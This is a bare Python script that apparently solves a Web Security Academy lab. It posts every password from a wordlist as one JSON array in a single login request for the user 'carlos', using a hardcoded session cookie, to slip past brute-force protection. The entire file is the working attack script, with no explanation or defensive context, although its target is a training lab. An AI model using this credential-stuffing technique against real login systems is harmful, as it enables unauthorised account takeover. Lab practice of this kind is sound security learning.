import requests

url = 'https://acad1f221fec6538c02d23f000280079.web-security-academy.net/login'
cookies = {'session': 'OiWo3BuSk4icRGA5eN48L7W0DnLTl8hW'}

username = 'carlos'

with open('passwords.txt', 'r') as f:
    passwords = [p.strip() for p in f.readlines()]

data = {'username': username, 'password': passwords}
requests.post(url=url, cookies=cookies, json=data)
